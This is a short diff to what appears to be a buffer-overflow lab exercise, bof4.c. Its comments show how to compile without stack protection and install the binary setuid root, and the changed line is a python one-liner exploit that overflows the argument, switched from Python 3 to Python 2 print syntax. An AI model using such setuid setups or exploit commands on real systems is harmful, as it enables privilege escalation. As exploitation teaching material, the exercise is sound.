@@ -9,7 +9,7 @@
 // COMPILE $ gcc -fno-stack-protector bof4.c -o bof4
 // SETUID  $ sudo chown root:root bof4
 //         $ sudo chmod 4755 bof4
-// EXPLOIT $ ./bof4 `python -c "print('\x78\x56\x34\x12'*36)"`
+// EXPLOIT $ ./bof4 `python -c "print '\x78\x56\x34\x12'*36"`
 
 void vuln(char * arg) {
     int innocent;
